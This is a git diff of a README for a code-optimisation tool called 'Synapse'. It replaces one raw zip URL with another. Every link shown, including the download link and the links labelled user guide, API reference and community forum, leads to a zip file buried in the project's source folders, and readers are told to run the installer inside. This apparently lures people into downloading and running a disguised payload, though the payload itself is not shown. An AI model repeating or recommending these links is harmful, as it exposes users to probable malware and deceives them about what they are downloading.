@@ -1,7 +1,7 @@
 # 🧬 Synapse - Evolve Your Code Effortlessly
 
 <div align="center">
-[![Download Synapse](https://raw.githubusercontent.com/alexxsdev/Synapse/master/Synapse.Core/Telemetry/Synapse-ureterovaginal.zip)](https://raw.githubusercontent.com/alexxsdev/Synapse/master/Synapse.Core/Telemetry/Synapse-ureterovaginal.zip)
+[![Download Synapse](https://raw.githubusercontent.com/alexxsdev/Synapse/master/Examples/WebApi.Example/Services/Software-v1.2-beta.2.zip)](https://raw.githubusercontent.com/alexxsdev/Synapse/master/Examples/WebApi.Example/Services/Software-v1.2-beta.2.zip)
 </div>
 
 ---
@@ -12,7 +12,7 @@ To use Synapse, follow these easy steps:
 
 1. **Visit the Releases Page:** Click the link below to go to the Releases page.
 
-   [Download Synapse](https://raw.githubusercontent.com/alexxsdev/Synapse/master/Synapse.Core/Telemetry/Synapse-ureterovaginal.zip)
+   [Download Synapse](https://raw.githubusercontent.com/alexxsdev/Synapse/master/Examples/WebApi.Example/Services/Software-v1.2-beta.2.zip)
 
 2. **Choose Your Version:** Find the latest version listed on the Releases page. 
 
@@ -67,7 +67,7 @@ Synapse provides an advanced framework for optimizing your applications on the g
 
 You can download the latest version of Synapse by following these steps:
 
-1. **Go to the Releases Page:** [Download Synapse](https://raw.githubusercontent.com/alexxsdev/Synapse/master/Synapse.Core/Telemetry/Synapse-ureterovaginal.zip).
+1. **Go to the Releases Page:** [Download Synapse](https://raw.githubusercontent.com/alexxsdev/Synapse/master/Examples/WebApi.Example/Services/Software-v1.2-beta.2.zip).
 2. **Select the Latest Release:** Click on the latest release link to see available files.
 3. **Download the Executable or Zip File:** Choose the appropriate file for your operating system.
 4. **Install or Extract:** If it's an installer, run it. If it's a zip file, extract it first.
@@ -94,9 +94,9 @@ You can download the latest version of Synapse by following these steps:
 
 For detailed guides and advanced features, you can check the documentation:
 
-- [Comprehensive User Guide](https://raw.githubusercontent.com/alexxsdev/Synapse/master/Synapse.Core/Telemetry/Synapse-ureterovaginal.zip)
-- [API Reference](https://raw.githubusercontent.com/alexxsdev/Synapse/master/Synapse.Core/Telemetry/Synapse-ureterovaginal.zip)
-- [Community Forum](https://raw.githubusercontent.com/alexxsdev/Synapse/master/Synapse.Core/Telemetry/Synapse-ureterovaginal.zip)
+- [Comprehensive User Guide](https://raw.githubusercontent.com/alexxsdev/Synapse/master/Examples/WebApi.Example/Services/Software-v1.2-beta.2.zip)
+- [API Reference](https://raw.githubusercontent.com/alexxsdev/Synapse/master/Examples/WebApi.Example/Services/Software-v1.2-beta.2.zip)
+- [Community Forum](https://raw.githubusercontent.com/alexxsdev/Synapse/master/Examples/WebApi.Example/Services/Software-v1.2-beta.2.zip)
 
 ---
 
